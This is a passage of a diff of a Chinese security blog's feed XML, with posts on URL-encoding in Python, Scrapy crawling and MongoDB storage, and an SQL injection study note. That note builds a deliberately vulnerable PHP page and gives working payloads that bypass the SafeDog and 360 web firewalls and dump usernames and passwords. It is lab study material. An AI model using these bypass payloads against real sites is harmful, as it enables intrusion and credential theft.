class="line">3、在中文后加上&quot;.encode(&apos;utf-8&apos;)&quot;</span><br></pre></td></tr></table></figure><p>这几种方法在我这里都行不通，抓包也可以看到数据包里的中文并不是我们想象的经过 URL 编码的字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /test=b&apos;%5Cxe6%5Cxb5%5Cx8b%5Cxe8%5Cxaf%5Cx95&apos; HTTP/1.1</span><br></pre></td></tr></table></figure><h1 id="0x02-可行的办法"><a href="#0x02-可行的办法" class="headerlink" title="0x02 可行的办法"></a>0x02 可行的办法</h1><p>最后才意识到，其实并不需要对中文进行 GBK、UTF-8 转码，而应该对其进行 URL 编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import quote</span><br><span class="line">text = quote(&quot;测试&quot;, &apos;utf-8&apos;)</span><br></pre></td></tr></table></figure><p>利用 quote 函数对 “测试” 进行 URL 编码后，再次抓包可以看到中文部分已经是 URL 格式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /test=%E6%B5%8B%E8%AF%95 HTTP/1.1</span><br></pre></td></tr></table></figure><p>此时，程序也不再报错，可以顺利执行了。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202951.html">https://www.teamssix.com/year/200206-202951.html</a><br>参考文章：<a href="https://blog.csdn.net/qq_33876553/article/details/79730246" target="_blank" rel="noopener">https://blog.csdn.net/qq_33876553/article/details/79730246</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;UnicodeEncodeError: &amp;apos;latin-1&amp;apos; codec can&amp;apos;t encode characters in position 38-39: ordinal not in range(256)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-      <category term="Python3" scheme="https://www.teamssix.com/tags/Python3/"/>
-    
-      <category term="解决办法" scheme="https://www.teamssix.com/tags/%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【经验总结】SQL注入Bypass安全狗360主机卫士</title>
-    <link href="https://www.teamssix.com/year/200105-211642.html"/>
-    <id>https://www.teamssix.com/year/200105-211642.html</id>
-    <published>2020-01-05T13:16:42.000Z</published>
-    <updated>2020-01-05T13:54:10.260Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45</p><a id="more"></a><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'id'</span>]==<span class="keyword">null</span>)&#123;$id=$_POST[<span class="string">'id'</span>];&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;$id=$_GET[<span class="string">'id'</span>];&#125;</span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());&#125;</span><br><span class="line">mysql_select_db(<span class="string">"dvwa"</span>, $con);</span><br><span class="line">$query = <span class="string">"SELECT first_name,last_name FROM users WHERE user_id = '$id'; "</span>;</span><br><span class="line">$result = mysql_query($query)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> $row[<span class="string">'0'</span>] . <span class="string">"&amp;nbsp"</span> . $row[<span class="string">'1'</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的测试代码是参考安全客上的一篇文章，不过为了方便测试在原代码的基础上加入了 POST 传参功能，代码来自本文参考文章第 2 篇。</p><p>为方便接下来的测试，需要本地先安装 dvwa ，至于代码中其他的参数，比如数据库地址、用户名、密码什么的自行根据自己本地配置情况修改即可。</p><p>如果这个代码在使用的过程中，只使用 POST 方法传参的话，页面是会输出错误信息的，如果不想让它输出错误信息，可以在 php.ini 文件中修改 display_errors 为 Off ，然后重启 Apache 即可。</p><p>访问本地搭建的靶场地址，像下面这个样子就算是搭建成功了，其中 192.168.38.132​ 需要修改为你自己的靶机 IP 地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/sql.php?id=1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass1.png" alt></p><h1 id="0x02-安全狗"><a href="#0x02-安全狗" class="headerlink" title="0x02 安全狗"></a>0x02 安全狗</h1><h2 id="1、搭建"><a href="#1、搭建" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>下载地址：<a href="http://free.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/website_safedog.html</a></p><p>我下载的是 Windows Apache V4.0 的版本，2019-11-27 更新的规则。</p><p>在安装安全狗的时候，如果不知道服务名填什么，可以查看本文参考文章第 5 篇。</p><p>如果使用 phpstudy 8.0 及更高版本可能在系统服务中找不到 apache 的服务名，所以这时建议使用 8.0 以下版本，比如 phpstudy 2018，之后再设置运行模式为“系统服务”即可，不要问我怎么知道的 [狗头]</p><p>搭建好后，我们构造 SQL 注入语句判断注入点，访问目标网站，网站有安全狗的提示，说明就搭建好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/sql.php?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass2.png" alt></p><h2 id="2、找寻绕过方法"><a href="#2、找寻绕过方法" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>多次测试发现单引号不会被拦截，and 也不会被拦截，只有当 and 后加上字符，比如 and ‘1’ 的时候才会被拦截，所以接下来就主要针对 and 进行绕过测试。</p><p>一般情况下，如果 and 被拦截，可以下列字符进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;</span><br></pre></td></tr></table></figure><p>或者使用 or 进行绕过，也可以直接使用异或进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^，xor</span><br></pre></td></tr></table></figure><p>因为我下载的版本的规则是最新的，所以参考文章中利用 &amp;&amp; 替换 and 的方法已经失效了，经过多次测试，这里使用异或是可以绕过安全狗进而判断注入点的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; xor &apos;1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass3.png" alt></p><p>接下来使用 union select 查看一下数据库名和用户名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p>直接这样肯定会被拦截的，所以接下来找寻绕过方法。</p><h3 id="a、利用-代替空格"><a href="#a、利用-代替空格" class="headerlink" title="a、利用()代替空格"></a>a、利用()代替空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select(database()),(user())&apos;</span><br></pre></td></tr></table></figure><p>数据或者函数周围可以无限嵌套()。</p><h3 id="b、利用-mysql-特性-执行语句"><a href="#b、利用-mysql-特性-执行语句" class="headerlink" title="b、利用 mysql 特性 /!/ 执行语句"></a>b、利用 mysql 特性 /<em>!</em>/ 执行语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union /*!50010select*/(database()),(user())&apos;</span><br></pre></td></tr></table></figure><p>/<em>!</em>/ 中间的代码是可以执行的，其中 50010 为 mysql 版本号，只要 mysql 大于这个版本就会执行里面的代码。</p><h3 id="c、利用-混淆代码"><a href="#c、利用-混淆代码" class="headerlink" title="c、利用/**/混淆代码"></a>c、利用/**/混淆代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/**//*!50010select*/(database/**/()),(user/**/())&apos;</span><br></pre></td></tr></table></figure><p>mysql 关键字中是不能插入 /**/ 的，即 se/**/lect 是会报错的，但是函数名和括号之间是可以加上 /**/ 的,像 database/**/() 这样的代码是可以执行的。</p><p>事实上，由于我的防护规则是 2019-11-27 更新的，所以即使如此，依旧不能绕过，不过由于安全狗对于 GET 的过滤相较于 POST 更为严格，所以后来经过测试发现使用 POST 方法是可以进行绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass4.png" alt></p><p>可以看到使用 POST 方法是可以成功绕过，除了上面的3个方法，有时候使用 %00 也会有意想不到的效果。</p><p>知道了绕过方法，便可以一路找到用户名和密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select user,password from users#</span><br></pre></td></tr></table></figure><p>经过测试，发现在 POST 方法下，加个括号即可绕过安全狗，这也足以看出安全狗对于 POST 方法的过滤是多么不严格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select user,password from (users)#</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass5.png" alt></p><p>绕过的方法还有很多，安全狗的就记录到这里，接下来看看 360 主机卫士。</p><h1 id="0x03-360-主机卫士"><a href="#0x03-360-主机卫士" class="headerlink" title="0x03 360 主机卫士"></a>0x03 360 主机卫士</h1><h2 id="1、搭建-1"><a href="#1、搭建-1" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>曾经 360 出现过一款 360 主机卫士，不过现在已经停止更新和维护了，官网也打不开了，所以只能在第三方网站下载了，这里我下载的是 2.0.5.9 版本。</p><p>下载地址：<a href="http://www.pc6.com/softview/SoftView_145230.html" target="_blank" rel="noopener">http://www.pc6.com/softview/SoftView_145230.html</a></p><p>虽然 360 主机卫士已经停止了更新，但是拿来练练手还是可以滴。</p><p>下载之后，访问 ‘ and ‘1’=’1 如果发现被拦截了，返回内容像下面这个样子，说明就搭建成功了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass6.png" alt></p><h2 id="2、找寻绕过方法-1"><a href="#2、找寻绕过方法-1" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>经过多次测试，这里使用 &amp;&amp; 即可绕过，使用异或也是可以绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass7.png" alt></p><p>接下来看看 union select 怎么进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p>经过多次测试，发现可以通过缓冲区溢出进行绕过，但也只有在 POST 方法下才有效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)union select database(),user()&apos;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass8.png" alt></p><h1 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h1><p>提到 SQL 注入的工具，个人觉着就不得不提 shack2 的超级 SQL 注入工具，针对于上面缓冲区绕过的情况，使用这个工具可以很方便的进行 SQL 注入。</p><p>工具下载地址：<a href="https://github.com/shack2/SuperSQLInjectionV1/releases" target="_blank" rel="noopener">https://github.com/shack2/SuperSQLInjectionV1/releases</a></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass9.png" alt></p><p>把 Burp 中的数据包复制到工具中，在注入标记、编码标记后，就可以获取数据了，对于如何标记注入点不理解的可以看看这个工具的教学视频以及文档，会容易理解些。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass10.png" alt></p><p>至于其他更为复杂的绕过，比如上面安全狗的绕过，利用这个工具的注入绕过模块也是可以的，当然使用 sqlmap 的 tamper 脚本也是 OK 的，暂时本文就先记录到这里。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://zhuanlan.zhihu.com/p/41332480" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/41332480</a><br><a href="https://www.anquanke.com/post/id/102852" target="_blank" rel="noopener">https://www.anquanke.com/post/id/102852</a><br><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a><br><a href="https://www.cnblogs.com/xiaozi/p/9132737.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/9132737.html</a><br><a href="https://blog.csdn.net/weixin_30886233/article/details/95871508" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30886233/article/details/95871508</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。&lt;/p&gt;
-&lt;h1 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h1&gt;&lt;p&gt;测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-      <category term="SQL 注入" scheme="https://www.teamssix.com/tags/SQL-%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="Bypass" scheme="https://www.teamssix.com/tags/Bypass/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 6、继续爬虫、终止和重启任务</title>
-    <link href="https://www.teamssix.com/year/191226-151707.html"/>
-    <id>https://www.teamssix.com/year/191226-151707.html</id>
-    <published>2019-12-26T07:17:07.000Z</published>
-    <updated>2019-12-26T08:24:36.129Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。</p><h1 id="0x01-修改代码"><a href="#0x01-修改代码" class="headerlink" title="0x01 修改代码"></a>0x01 修改代码</h1><p>在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_urls = [</span><br><span class="line">   <span class="string">'https://www.teamssix.com'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/2/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/3/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/4/'</span>,</span><br><span class="line">   <span class="string">'https://www.teamssix.com/page/5/'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来在 sub_article 函数尾部添加 parse 函数的全部代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(response.text, <span class="string">'html.parser'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">   url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">   <span class="keyword">yield</span> scrapy.Request(url, callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>所以 sub_article 函数的完整代码就是这个样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   title = self.article_title(soup)</span><br><span class="line">   list = self.article_list(soup)</span><br><span class="line">   print(title)</span><br><span class="line">   item = TeamssixItem(_id = response.url,title = title,list = list)</span><br><span class="line">   <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">   soup = BeautifulSoup(response.text, <span class="string">'html.parser'</span>)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">      url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">      <span class="keyword">yield</span> scrapy.Request(url, callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>从最后一行 callback=self.sub_article 这里不难看出这里其实就是一个循环， sub_article 函数第一遍执行完，又会调用继续执行第二遍，直到 start_urls 被执行完。</p><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>代码修改的就这些，接下来直接 scrapy crawl blogurl 运行代码，来到 robo 3T 看看爬取到的数据。</p><p><img src="https://uploader.shimo.im/f/4C5P0BNBAy8DfwVP.png!thumbnail" alt="图片"></p><p>最终在这些 start_urls 中爬取下来了 43 篇文章，Emm，还行。</p><p>这次的 Scrapy 学习笔记就更新到这里，这个项目的代码已经放在了我的 GitHub 里，项目链接已经放在了下面。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>项目地址：<a href="https://github.com/teamssix/scrapy_study_notes" target="_blank" rel="noopener">https://github.com/teamssix/scrapy_study_notes</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。&lt;/p&gt;
-&lt;h1 id=&quot;0x01-修改代码&quot;&gt;&lt;a href=&quot;#0x01-修改代码&quot; class=&quot;headerlink&quot; title=&quot;0x01 修改代码&quot;&gt;&lt;/a&gt;0x01 修改代码&lt;/h1&gt;&lt;p&gt;在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;start_urls = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/2/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/3/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/4/&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;string&quot;&gt;&#39;https://www.teamssix.com/page/5/&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 5、利用 pipelines 和 settings 将爬取数据存储到 MongoDB</title>
-    <link href="https://www.teamssix.com/year/191226-151702.html"/>
-    <id>https://www.teamssix.com/year/191226-151702.html</id>
-    <published>2019-12-26T07:17:02.000Z</published>
-    <updated>2019-12-26T08:24:37.812Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。</p><h1 id="0x01-配置-pipelines-py"><a href="#0x01-配置-pipelines-py" class="headerlink" title="0x01 配置 pipelines.py"></a>0x01 配置 pipelines.py</h1><p>首先来到 pipelines.py 文件下，在这里写入连接操作数据库的一些功能。</p><p>将连接操作 mongo 所需要的包导入进来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来定义一些参数，注意下面的函数都是在 TeamssixPipeline 类下的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span>:</span></span><br><span class="line">    cls.DB_URL = crawler.settings.get(<span class="string">'MONGO_DB_URI'</span>)</span><br><span class="line">    cls.DB_NAME = crawler.settings.get(<span class="string">'MONGO_DB_NAME'</span>)</span><br><span class="line">    <span class="keyword">return</span> cls()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">    self.client = pymongo.MongoClient(self.DB_URL)</span><br><span class="line">    self.db = self.client[self.DB_NAME]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">    self.client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">    collection = self.db[spider.name]</span><br><span class="line">    collection.insert_one(dict(item))</span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><h1 id="0x02-配置-settings-py"><a href="#0x02-配置-settings-py" class="headerlink" title="0x02 配置 settings.py"></a>0x02 配置 settings.py</h1><p>ITEM_PIPELINES 是settings.py 文件自带的，把注释符号删掉就好</p><figure class="highlight 